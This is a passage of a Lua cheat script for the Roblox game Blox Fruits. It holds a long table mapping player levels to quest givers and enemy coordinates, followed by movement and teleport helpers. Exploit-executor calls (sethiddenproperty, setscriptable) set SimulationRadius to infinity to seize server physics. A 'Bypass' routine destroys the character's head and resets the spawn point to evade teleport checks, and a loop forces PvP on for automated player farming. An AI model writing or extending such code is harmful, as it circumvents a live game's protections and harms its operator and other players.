                    CFrameQuest = CFrame.new(-2440.79639, 71.7140732, -3216.06812, 0.866007268, 0, 0.500031412, 0, 1, 0, -0.500031412, 0, 0.866007268)
                    CFrameMon = CFrame.new(-1814.70313, 72.9919434, -3208.86621, -0.900422215, 7.93464423e-08, -0.435017526, 3.68856199e-08, 1, 1.06050372e-07, 0.435017526, 7.94441988e-08, -0.900422215)
                elseif MyLevel == 950 or MyLevel <= 974 then -- Zombie
                    Ms = "Zombie"
                    NameQuest = "ZombieQuest"
                    LevelQuest = 1
                    NameMon = "Zombie"
                    CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                    CFrameMon = CFrame.new(-5649.23438, 126.0578, -737.773743, 0.355238914, -8.10359282e-08, 0.934775114, 1.65461245e-08, 1, 8.04023372e-08, -0.934775114, -1.3095117e-08, 0.355238914)
                elseif MyLevel == 975 or MyLevel <= 999 then -- Vampire
                    Ms = "Vampire"
                    NameQuest = "ZombieQuest"
                    LevelQuest = 2
                    NameMon = "Vampire"
                    CFrameQuest = CFrame.new(-5497.06152, 47.5923004, -795.237061, -0.29242146, 0, -0.95628953, 0, 1, 0, 0.95628953, 0, -0.29242146)
                    CFrameMon = CFrame.new(-6030.32031, 0.4377408, -1313.5564, -0.856965423, 3.9138893e-08, -0.515373945, -1.12178942e-08, 1, 9.45958547e-08, 0.515373945, 8.68467822e-08, -0.856965423)
                elseif MyLevel == 1000 or MyLevel <= 1049 then -- Snow Trooper **
                    Ms = "Snow Trooper"
                    NameQuest = "SnowMountainQuest"
                    LevelQuest = 1
                    NameMon = "Snow Trooper"
                    CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                    CFrameMon = CFrame.new(621.003418, 391.361053, -5335.43604, 0.481644779, 0, 0.876366913, 0, 1, 0, -0.876366913, 0, 0.481644779)
                elseif MyLevel == 1050 or MyLevel <= 1099 then -- Winter Warrior
                    Ms = "Winter Warrior"
                    NameQuest = "SnowMountainQuest"
                    LevelQuest = 2
                    NameMon = "Winter Warrior"
                    CFrameQuest = CFrame.new(609.858826, 400.119904, -5372.25928, -0.374604106, 0, 0.92718488, 0, 1, 0, -0.92718488, 0, -0.374604106)
                    CFrameMon = CFrame.new(1295.62683, 429.447784, -5087.04492, -0.698032081, -8.28980049e-08, -0.71606636, -1.98835952e-08, 1, -9.63858184e-08, 0.71606636, -5.30424877e-08, -0.698032081)
                elseif MyLevel == 1100 or MyLevel <= 1124 then -- Lab Subordinate
                    Ms = "Lab Subordinate"
                    NameQuest = "IceSideQuest"
                    LevelQuest = 1
                    NameMon = "Lab Subordinate"
                    CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
                    CFrameMon = CFrame.new(-5769.2041, 37.9288292, -4468.38721, -0.569419742, -2.49055017e-08, 0.822046936, -6.96206541e-08, 1, -1.79282633e-08, -0.822046936, -6.74401548e-08, -0.569419742)
                elseif MyLevel == 1125 or MyLevel <= 1174 then -- Horned Warrior
                    Ms = "Horned Warrior"
                    NameQuest = "IceSideQuest"
                    LevelQuest = 2
                    NameMon = "Horned Warrior"
                    CFrameQuest = CFrame.new(-6064.06885, 15.2422857, -4902.97852, 0.453972578, -0, -0.891015649, 0, 1, -0, 0.891015649, 0, 0.453972578)
                    CFrameMon = CFrame.new(-6401.27979, 15.9775667, -5948.24316, 0.388303697, 0, -0.921531856, 0, 1, 0, 0.921531856, 0, 0.388303697)
                elseif MyLevel == 1175 or MyLevel <= 1199 then -- Magma Ninja
                    Ms = "Magma Ninja"
                    NameQuest = "FireSideQuest"
                    LevelQuest = 1
                    NameMon = "Magma Ninja"
                    CFrameQuest = CFrame.new(-5428.03174, 15.0622921, -5299.43457, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                    CFrameMon = CFrame.new(-5466.06445, 57.6952019, -5837.42822, -0.988835871, 0, -0.149006829, 0, 1, 0, 0.149006829, 0, -0.988835871)
                elseif MyLevel == 1200 or MyLevel <= 1249 then 
                    Ms = "Lava Pirate"
                    NameQuest = "FireSideQuest"
                    LevelQuest = 2
                    NameMon = "Lava Pirate"
                    CFrameQuest = CFrame.new(-5431.09473, 15.9868021, -5296.53223, 0.831796765, 1.15322464e-07, -0.555080295, -1.10814341e-07, 1, 4.17010995e-08, 0.555080295, 2.68240168e-08, 0.831796765)
                    CFrameMon = CFrame.new(-5169.71729, 34.1234779, -4669.73633, -0.196780294, 0, 0.98044765, 0, 1.00000012, -0, -0.98044765, 0, -0.196780294)
                elseif MyLevel == 1250 or MyLevel <= 1274 then 
                    Ms = "Ship Deckhand"
                    NameQuest = "ShipQuest1"
                    LevelQuest = 1
                    NameMon = "Ship Deckhand"
                    CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
                    CFrameMon = CFrame.new(1163.80872, 138.288452, 33058.4258, -0.998580813, 5.49076979e-08, -0.0532564968, 5.57436763e-08, 1, -1.42118655e-08, 0.0532564968, -1.71604082e-08, -0.998580813)
                elseif MyLevel == 1275 or MyLevel <= 1299 then 
                    Ms = "Ship Engineer"
                    NameQuest = "ShipQuest1"
                    LevelQuest = 2
                    NameMon = "Ship Engineer"
                    CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
                    CFrameMon = CFrame.new(921.30249023438, 125.400390625, 32937.34375)
                elseif MyLevel == 1300 or MyLevel <= 1324 then 
                    Ms = "Ship Steward"
                    NameQuest = "ShipQuest2"
                    LevelQuest = 1
                    NameMon = "Ship Steward"
                    CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
                    CFrameMon = CFrame.new(917.96057128906, 136.89932250977, 33343.4140625)
                elseif MyLevel == 1325 or MyLevel <= 1349 then 
                    Ms = "Ship Officer"
                    NameQuest = "ShipQuest2"
                    LevelQuest = 2
                    NameMon = "Ship Officer"
                    CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
                    CFrameMon = CFrame.new(944.44964599609, 181.40081787109, 33278.9453125)
                elseif MyLevel == 1350 or MyLevel <= 1374 then 
                    Ms = "Arctic Warrior"
                    NameQuest = "FrostQuest"
                    LevelQuest = 1
                    NameMon = "Arctic Warrior"
                    CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                    CFrameMon = CFrame.new(5878.23486, 81.3886948, -6136.35596, -0.451037169, 2.3908234e-07, 0.892505825, -1.08168464e-07, 1, -3.22542007e-07, -0.892505825, -2.4201924e-07, -0.451037169)
                elseif MyLevel == 1375 or MyLevel <= 1424 then -- Snow Lurker
                    Ms = "Snow Lurker"
                    NameQuest = "FrostQuest"
                    LevelQuest = 2
                    NameMon = "Snow Lurker"
                    CFrameQuest = CFrame.new(5667.6582, 26.7997818, -6486.08984, -0.933587909, 0, -0.358349502, 0, 1, 0, 0.358349502, 0, -0.933587909)
                    CFrameMon = CFrame.new(5513.36865, 60.546711, -6809.94971, -0.958693981, -1.65617333e-08, 0.284439981, -4.07668654e-09, 1, 4.44854642e-08, -0.284439981, 4.14883701e-08, -0.958693981)
                elseif MyLevel == 1425 or MyLevel <= 1449 then -- Sea Soldier
                    Ms = "Sea Soldier"
                    NameQuest = "ForgottenQuest"
                    LevelQuest = 1
                    NameMon = "Sea Soldier"
                    CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
                    CFrameMon = CFrame.new(-3115.78223, 63.8785706, -9808.38574, -0.913427353, 3.11199457e-08, 0.407000452, 7.79564235e-09, 1, -5.89660658e-08, -0.407000452, -5.06883708e-08, -0.913427353)
                elseif MyLevel >= 1450 then -- Water Fighter
                    Ms = "Water Fighter"
                    NameQuest = "ForgottenQuest"
                    LevelQuest = 2
                    NameMon = "Water Fighter"
                    CFrameQuest = CFrame.new(-3054.44458, 235.544281, -10142.8193, 0.990270376, -0, -0.13915664, 0, 1, -0, 0.13915664, 0, 0.990270376)
                    CFrameMon = CFrame.new(-3212.99683, 263.809296, -10551.8799, 0.742111444, -5.59139615e-08, -0.670276582, 1.69155214e-08, 1, -6.46908234e-08, 0.670276582, 3.66697037e-08, 0.742111444)
                end
            end
            if third_sea then
                if MyLevel >= 1500 and MyLevel <= 1524 then -- Pirate Millionaire
                    Ms = "Pirate Millionaire"
                    NameQuest = "PiratePortQuest"
                    LevelQuest = 1
                    NameMon = "Pirate Millionaire"
                    CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(81.164993286133, 43.755737304688, 5724.7021484375)
                elseif MyLevel >= 1525 and MyLevel <= 1574 then -- Pistol Billionaire
                    Ms = "Pistol Billionaire"
                    NameQuest = "PiratePortQuest"
                    LevelQuest = 2
                    NameMon = "Pistol Billionaire"
                    CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(81.164993286133, 43.755737304688, 5724.7021484375)
                elseif MyLevel >= 1575 and MyLevel <= 1599 then -- Dragon Crew Warrior
                    Ms = "Dragon Crew Warrior"
                    NameQuest = "AmazonQuest"
                    LevelQuest = 1
                    NameMon = "Dragon Crew Warrior"
                    CFrameQuest = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359)
                    CFrameMon = CFrame.new(6241.9951171875, 51.522083282471, -1243.9771728516)
                elseif MyLevel >= 1600 and MyLevel <= 1624 then -- Dragon Crew Archer
                    Ms = "Dragon Crew Archer"
                    NameQuest = "AmazonQuest"
                    LevelQuest = 2
                    NameMon = "Dragon Crew Archer"
                    CFrameQuest = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359)
                    CFrameMon = CFrame.new(6488.9155273438, 383.38375854492, -110.66246032715)
                elseif MyLevel >= 1625 and MyLevel <= 1649 then -- Female Islander
                    Ms = "Female Islander"
                    NameQuest = "AmazonQuest2"
                    LevelQuest = 1
                    NameMon = "Female Islander"
                    CFrameQuest = CFrame.new(5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(4770.4990234375, 758.95520019531, 1069.8680419922)
                elseif MyLevel >= 1650 and MyLevel <= 1699 then -- Giant Islander
                    Ms = "Giant Islander"
                    NameQuest = "AmazonQuest2"
                    LevelQuest = 2
                    NameMon = "Giant Islander"
                    CFrameQuest = CFrame.new(5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(4530.3540039063, 656.75695800781, -131.60952758789)
                elseif MyLevel >= 1700 and MyLevel <= 1724 then -- Marine Commodore
                    Ms = "Marine Commodore"
                    NameQuest = "MarineTreeIsland"
                    LevelQuest = 1
                    NameMon = "Marine Commodore"
                    CFrameQuest = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
                    CFrameMon = CFrame.new(2490.0844726563, 190.4232635498, -7160.0502929688)
                elseif MyLevel >= 1725 and MyLevel <= 1774 then -- Marine Rear Admiral
                    Ms = "Marine Rear Admiral"
                    NameQuest = "MarineTreeIsland"
                    LevelQuest = 2
                    NameMon = "Marine Rear Admiral"
                    CFrameQuest = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
                    CFrameMon = CFrame.new(3951.3903808594, 229.11549377441, -6912.81640625)
                elseif MyLevel >= 1775 and MyLevel <= 1799 then -- Fishman Raider
                    Ms = "Fishman Raider"
                    NameQuest = "DeepForestIsland3"
                    LevelQuest = 1
                    NameMon = "Fishman Raider"
                    CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                    CFrameMon = CFrame.new(-10322.400390625, 390.94473266602, -8580.0908203125)
                elseif MyLevel >= 1800 and MyLevel <= 1824 then -- Fishman Captain
                    Ms = "Fishman Captain"
                    NameQuest = "DeepForestIsland3"
                    LevelQuest = 2
                    NameMon = "Fishman Captain"
                    CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                    CFrameMon = CFrame.new(-11194.541992188, 442.02795410156, -8608.806640625)
                elseif MyLevel >= 1825 and MyLevel <= 1849 then -- Forest Pirate
                    Ms = "Forest Pirate"
                    NameQuest = "DeepForestIsland"
                    LevelQuest = 1
                    NameMon = "Forest Pirate"
                    CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
                    CFrameMon = CFrame.new(-13225.809570313, 428.19387817383, -7753.1245117188)
                elseif MyLevel >= 1850 and MyLevel <= 1899 then -- Mythological Pirate
                    Ms = "Mythological Pirate"
                    NameQuest = "DeepForestIsland"
                    LevelQuest = 2
                    NameMon = "Mythological Pirate"
                    CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
                    CFrameMon = CFrame.new(-13869.172851563, 564.95251464844, -7084.4135742188)
                elseif MyLevel >= 1900 and MyLevel <= 1924 then -- Jungle Pirate
                    Ms = "Jungle Pirate"
                    NameQuest = "DeepForestIsland2"
                    LevelQuest = 1
                    NameMon = "Jungle Pirate"
                    CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                    CFrameMon = CFrame.new(-11982.221679688, 376.32522583008, -10451.415039063)
                elseif MyLevel >= 1925 and MyLevel <= 1974 then -- Musketeer Pirate
                    Ms = "Musketeer Pirate"
                    NameQuest = "DeepForestIsland2"
                    LevelQuest = 2
                    NameMon = "Musketeer Pirate"
                    CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                    CFrameMon = CFrame.new(-13282.3046875, 496.23684692383, -9565.150390625)
                elseif MyLevel >= 1975 and MyLevel <= 1999 then
                    Ms = "Reborn Skeleton"
                    NameQuest = "HauntedQuest1"
                    LevelQuest = 1
                    NameMon = "Reborn Skeleton"
                    CFrameQuest = CFrame.new(-9480.8271484375, 142.13066101074, 5566.0712890625)
                    CFrameMon = CFrame.new(-8817.880859375, 191.16761779785, 6298.6557617188)
                elseif MyLevel >= 2000 and MyLevel <= 2024 then
                    Ms = "Living Zombie"
                    NameQuest = "HauntedQuest1"
                    LevelQuest = 2
                    NameMon = "Living Zombie"
                    CFrameQuest = CFrame.new(-9480.8271484375, 142.13066101074, 5566.0712890625)
                    CFrameMon = CFrame.new(-10125.234375, 183.94705200195, 6242.013671875)
                elseif MyLevel >= 2025 and MyLevel <= 2049  then
                    Ms = "Demonic Soul"
                    NameQuest = "HauntedQuest2"
                    LevelQuest = 1
                    NameMon = "Demonic Soul"
                    CFrameQuest = CFrame.new(-9516.9931640625, 178.00651550293, 6078.4653320313)
                    CFrameMon = CFrame.new(-9712.03125, 204.69589233398, 6193.322265625)
                elseif MyLevel >= 2050 and MyLevel <= 2074 then
                    Ms = "Posessed Mummy"
                    NameQuest = "HauntedQuest2"
                    LevelQuest = 2
                    NameMon = "Posessed Mummy"
                    CFrameQuest = CFrame.new(-9516.9931640625, 178.00651550293, 6078.4653320313)
                    CFrameMon = CFrame.new(-9545.7763671875, 69.619895935059, 6339.5615234375)    
                elseif MyLevel >= 2075 and MyLevel <= 2099 then
                    Ms = "Peanut Scout"
                    NameQuest = "NutsIslandQuest"
                    LevelQuest = 1
                    NameMon = "Peanut Scout"
                    CFrameQuest = CFrame.new(-2104.17163, 38.1299706, -10194.418, 0.758814394, -1.38604395e-09, 0.651306927, 2.85280208e-08, 1, -3.1108879e-08, -0.651306927, 4.21863646e-08, 0.758814394)
                    CFrameMon = CFrame.new(-2098.07544, 192.611862, -10248.8867, 0.983392298, -9.57031787e-08, 0.181492642, 8.7276355e-08, 1, 5.44169616e-08, -0.181492642, -3.76732068e-08, 0.983392298)
                elseif MyLevel >= 2100 and MyLevel <= 2124 then
                    Ms = "Peanut President"
                    NameQuest = "NutsIslandQuest"
                    LevelQuest = 2
                    NameMon = "Peanut President"
                    CFrameQuest = CFrame.new(-2104.17163, 38.1299706, -10194.418, 0.758814394, -1.38604395e-09, 0.651306927, 2.85280208e-08, 1, -3.1108879e-08, -0.651306927, 4.21863646e-08, 0.758814394)
                    CFrameMon = CFrame.new(-1876.95959, 192.610947, -10542.2939, 0.0553516336, -2.83836812e-08, 0.998466909, -6.89634405e-10, 1, 2.84654931e-08, -0.998466909, -2.26418861e-09, 0.0553516336)
                elseif MyLevel >= 2125 and MyLevel <= 2149 then
                    Ms = "Ice Cream Chef"
                    NameQuest = "IceCreamIslandQuest"
                    LevelQuest = 1
                    NameMon = "Ice Cream Chef"
                    CFrameQuest = CFrame.new(-820.404358, 65.8453293, -10965.5654, 0.822534859, 5.24448502e-08, -0.568714678, -2.08336317e-08, 1, 6.20846663e-08, 0.568714678, -3.92184099e-08, 0.822534859)
                    CFrameMon = CFrame.new(-821.614075, 208.39537, -10990.7617, -0.870096624, 3.18909272e-08, 0.492881238, -1.8357893e-08, 1, -9.71107568e-08, -0.492881238, -9.35439957e-08, -0.870096624)
                elseif MyLevel >= 2150 and MyLevel <= 2199 then 
                    Ms = "Ice Cream Commander"
                    NameQuest = "IceCreamIslandQuest"
                    LevelQuest = 2
                    NameMon = "Ice Cream Commander"
                    CFrameQuest = CFrame.new(-819.376526, 67.4634171, -10967.2832)
                    CFrameMon = CFrame.new(-610.11669921875, 208.26904296875, -11253.686523438)
                elseif MyLevel >= 2200 and MyLevel <= 2224 then 
                    Ms = "Cookie Crafter"
                    NameQuest = "CakeQuest1"
                    LevelQuest = 1
                    NameMon = "Cookie Crafter"
                    CFrameQuest = CFrame.new(-2020.6068115234375, 37.82400894165039, -12027.80859375)
                    CFrameMon = CFrame.new(-2286.684326171875, 146.5656280517578, -12226.8818359375)
                elseif MyLevel >= 2225 and MyLevel <= 2249 then 
                    Ms = "Cake Guard"
                    NameQuest = "CakeQuest1"
                    LevelQuest = 2
                    NameMon = "Cake Guard"
                    CFrameQuest = CFrame.new(-2020.6068115234375, 37.82400894165039, -12027.80859375)
                    CFrameMon = CFrame.new(-1817.9747314453125, 209.5632781982422, -12288.9228515625)
                elseif MyLevel >= 2250 and MyLevel <= 2274 then 
                    Ms = "Baking Staff"
                    NameQuest = "CakeQuest2"
                    LevelQuest = 1
                    NameMon = "Baking Staff"
                    CFrameQuest = CFrame.new(-1928.31763, 37.7296638, -12840.626)
                    CFrameMon = CFrame.new(-1818.347900390625, 93.41275787353516, -12887.66015625)
                elseif MyLevel == 2275 or MyLevel <= 2299 then
                    Ms = "Head Baker"
                    CFrameMon = CFrame.new(-2068.284912109375, 68.5050048828125, -12950.775390625)
                    LevelQuest = 2
                    NameQuest = "CakeQuest2"
                    NameMon = "Head Baker"
                    CFrameQuest = CFrame.new(-1927.91602, 37.7981339, -12842.5391, -0.96804446, 4.22142143e-08, 0.250778586, 4.74911062e-08, 1, 1.49904711e-08, -0.250778586, 2.64211941e-08, -0.96804446)
                elseif MyLevel == 2300 or MyLevel <= 2324 then
                    Ms = "Cocoa Warrior"
                    CFrameMon = CFrame.new(43.3896598815918, 56.341636657714844, -12324.78515625)
                    LevelQuest = 1
                    NameQuest = "ChocQuest1"
                    NameMon = "Cocoa Warrior"
                    CFrameQuest = CFrame.new(231.88818359375, 24.769283294677734, -12202.1337890625)
                elseif MyLevel == 2325 or MyLevel <= 2349 then
                    Ms = "Chocolate Bar Battler"
                    CFrameMon = CFrame.new(719.6046752929688, 69.9678955078125, -12597.25390625)
                    LevelQuest = 2
                    NameQuest = "ChocQuest1"
                    NameMon = "Chocolate Bar Battler"
                    CFrameQuest = CFrame.new(231.88818359375, 24.769283294677734, -12202.1337890625)
                elseif MyLevel <= 2374 then
                    Ms = "Sweet Thief"
                    CFrameMon = CFrame.new(155.99618530273438, 54.82904815673828, -12580.7265625)
                    LevelQuest = 1
                    NameQuest = "ChocQuest2"
                    NameMon = "Sweet Thief"
                    CFrameQuest = CFrame.new(151.1981201171875, 24.828855514526367, -12778.08984375)
                elseif MyLevel <= 2449 then
                    Ms = "Candy Rebel"
                    CFrameMon = CFrame.new(-7.535787105560303, 35.526527404785156, -12896.34375)
                    LevelQuest = 2
                    NameQuest = "ChocQuest2"
                    NameMon = "Candy Rebel"
                    CFrameQuest = CFrame.new(151.1981201171875, 24.828855514526367, -12778.08984375)
                elseif MyLevel <= 2474 then
                    Ms = "Isle Outlaw"
                    CFrameMon = CFrame.new(-16241.5107, 121.569138, -185.911652)
                    LevelQuest = 1
                    NameQuest = "TikiQuest1"
                    NameMon = "Isle Outlaw"
                    CFrameQuest = CFrame.new(-16548.81640625, 55.60599136352539, -172.8125)
                elseif MyLevel <= 2499 then
                    Ms = "Island Boy"
                    CFrameMon = CFrame.new(-16946.541, 115.841362, -140.827713)
                    LevelQuest = 2
                    NameQuest = "TikiQuest1"
                    NameMon = "Island Boy"
                    CFrameQuest = CFrame.new(-16548.81640625, 55.60599136352539, -172.8125)
                elseif MyLevel <= 2524 then
                    Ms = "Sun-kissed Warrior"
                    CFrameMon = CFrame.new(-16191.3447, 21.656559, 968.527344)
                    LevelQuest = 1
                    NameQuest = "TikiQuest2"
                    NameMon = "kissed"
                    CFrameQuest = CFrame.new(-16539.3359, 55.6565514, 1050.70544)
                elseif MyLevel >= 2525 then
                    Ms = "Isle Champion"
                    CFrameMon = CFrame.new(-16813.209, 21.656559, 1058.44409)
                    LevelQuest = 2
                    NameQuest = "TikiQuest2"
                    NameMon = "Isle Champion"
                    CFrameQuest = CFrame.new(-16539.3359, 55.6565514, 1050.70544)
                end
            end

            return {
                QuestLevel = LevelQuest,
                QuestGiverPosition = CFrameQuest,
                NPCName = Ms,
                QuestNPCName = NameMon,
                QuestName = NameQuest,
                MyLevel = MyLevel,
                NPCPosition = CFrameMon
            }
        end
        local function GetIsLand(...)
            local RealtargetPos = {...}
            local targetPos = RealtargetPos[1]
            local RealTarget
            if type(targetPos) == "vector" then
                RealTarget = targetPos
            elseif type(targetPos) == "userdata" then
                RealTarget = targetPos.Position
            elseif type(targetPos) == "number" then
                RealTarget = CFrame.new(unpack(RealtargetPos))
                RealTarget = RealTarget.p
            end
        
            local ReturnValue
            local CheckInOut = math.huge;
            if LP.Team then
                for i,v in pairs(game.Workspace._WorldOrigin.PlayerSpawns:FindFirstChild(tostring(LP.Team)):GetChildren()) do 
                    local ReMagnitude = (RealTarget - v:GetModelCFrame().p).Magnitude;
                    if ReMagnitude < CheckInOut then
                        CheckInOut = ReMagnitude;
                        ReturnValue = v.Name
                    end
                end
                if ReturnValue then
                    return ReturnValue
                end 
            end
        end
        
        local function toPoint(cframe)
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            if Distance > 4000 then
                cframe = CFrame.new(cframe.x, cframe.y + 100, cframe.z)
            end
            if Distance >= 1000 then
                Speed = 220
            end
            if Distance < 1000 and Distance >= 750 then
                Speed = 230
            end
            if Distance < 25 then
                Speed = 1000
                LP.Character.HumanoidRootPart.CFrame = cframe
            elseif Distance < 50 then
                Speed = 600
                LP.Character.HumanoidRootPart.CFrame = cframe
            elseif Distance < 150 then
                Speed = 500
            elseif Distance < 250 then
                Speed = 400
            elseif Distance < 500 then
                Speed = 300
            elseif Distance < 750 then
                Speed = 250
            end
            game:GetService("TweenService"):Create(
                LP.Character.HumanoidRootPart,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end

        local function tweenToPointAdvanced(cframe)
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            if Distance > 4000 then
                cframe = CFrame.new(cframe.X, cframe.Y + 100, cframe.Z)
            end
            if Distance < 25 then
                Speed = 1000
                LP.Character.HumanoidRootPart.CFrame = cframe
            elseif Distance < 100 then
                Speed = 600
                LP.Character.HumanoidRootPart.CFrame = cframe
            elseif Distance < 150 then
                Speed = 500
            elseif Distance < 250 then
                Speed = 400
            elseif Distance < 500 then
                Speed = 300
            elseif Distance < 750 then
                Speed = 250
            elseif Distance >= 1000 then
                Speed = 220
            end
            game:GetService("TweenService"):Create(
                LP.Character.HumanoidRootPart,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end

        local function followTarget(cframe)
            if type(cframe) == "vector" then
                cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            end
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            if Distance > 4000 then
                cframe = CFrame.new(cframe.X, cframe.Y + 100, cframe.Z)
            end
            if Distance == nil then return end
            cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            if Distance >= 1000 then
                Speed = 220
            end
            if Distance < 1000 and Distance >= 750 then
                Speed = 230
            end
            if Distance < 25 then
                Speed = 600
            elseif Distance < 50 then
                Speed = 600
            elseif Distance < 150 then
                Speed = 500
            elseif Distance < 250 then
                Speed = 400
            elseif Distance < 500 then
                Speed = 300
            elseif Distance < 750 then
                Speed = 250
            end
            game:GetService("TweenService"):Create(
                LP.Character.HumanoidRootPart,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end


        local function toTarget(cframe)
            if type(cframe) == "vector" then
                cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            end
            Distance = (cframe.Position - LP.Character.HumanoidRootPart.Position).Magnitude
            if Distance > 4000 then
                cframe = CFrame.new(cframe.X, cframe.Y + 100, cframe.Z)
            end
            if Distance == nil then return end
            cframe = CFrame.new(cframe.X,cframe.Y,cframe.Z)
            if Distance >= 1000 then
                Speed = 220
            end
            if Distance < 1000 and Distance >= 750 then
                Speed = 230
            end
            if Distance < 25 then
                Speed = 1000
                LP.Character.HumanoidRootPart.CFrame = cframe
            elseif Distance < 50 then
                Speed = 600
                LP.Character.HumanoidRootPart.CFrame = cframe
            elseif Distance < 150 then
                Speed = 500
            elseif Distance < 250 then
                Speed = 400
            elseif Distance < 500 then
                Speed = 300
            elseif Distance < 750 then
                Speed = 250
            end
            game:GetService("TweenService"):Create(
                LP.Character.HumanoidRootPart,
                TweenInfo.new(Distance/Speed, Enum.EasingStyle.Linear),
                {CFrame = cframe}
            ):Play()
        end

        function InMyNetWork(object)
            if isnetworkowner then
                return isnetworkowner(object)
            else
                if (object.Position - LP.Character.HumanoidRootPart.Position).Magnitude <= 750 then 
                    return true
                end
                return false
            end
        end
        spawn(function()
            while true do wait()
                if setscriptable then
                    setscriptable(LP, "SimulationRadius", true)
                end
                if sethiddenproperty then
                    sethiddenproperty(LP, "SimulationRadius", math.huge)
                end
            end
        end)

        function EquipWeapon(Tool)
            pcall(function()
                for i,v in pairs(LP.Backpack:GetChildren()) do
                    if v.ToolTip == Tool then 
                        LP.Character.Humanoid:EquipTool(v) 
                        return
                    end
                end
            end)
        end
        function UnEquipWeapon(Weapon)
            if LP.Character:FindFirstChild(Weapon) then
                _G.NotAutoEquip = true
                LP.Character:FindFirstChild(Weapon).Parent = LP.Backpack
                _G.NotAutoEquip = false
            end
        end
        function Bypass(Point)
            toTarget(LP.Character.HumanoidRootPart.CFrame)
            wait(1.5)
            _G.StopTween = true
            _G.StertScript = false
            if not LP.Character:FindFirstChild("Head") then return end
            LP.Character.Head:Destroy()
            LP.Character.HumanoidRootPart.CFrame = Point * OffsetCFrame()
            wait(.2)
            LP.Character.HumanoidRootPart.CFrame = Point
            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
            wait(.1)
            LP.Character.HumanoidRootPart.CFrame = Point * OffsetCFrame()
            LP.Character.HumanoidRootPart.Anchored = true
            wait(.1)
            LP.Character.HumanoidRootPart.CFrame = Point
            wait(0.5)
            LP.Character.HumanoidRootPart.Anchored = false
        
            _G.StopTween = false
            _G.StertScript = false
            _G.Clip = false
            if LP.Character.HumanoidRootPart:FindFirstChild("BodyClip") then
                LP.Character.HumanoidRootPart:FindFirstChild("BodyClip"):Destroy()
            end
            _G.Clip = false
        end
        spawn(function()
            while wait() do
                if _G.AutoFarmPlayer then
                    local args = {
                        [1] = "EnablePvp"
                    }
                    ReplicatedStorage.Remotes.CommF_:InvokeServer(unpack(args))
                end
                wait(2)
            end
        end)

        spawn(function()
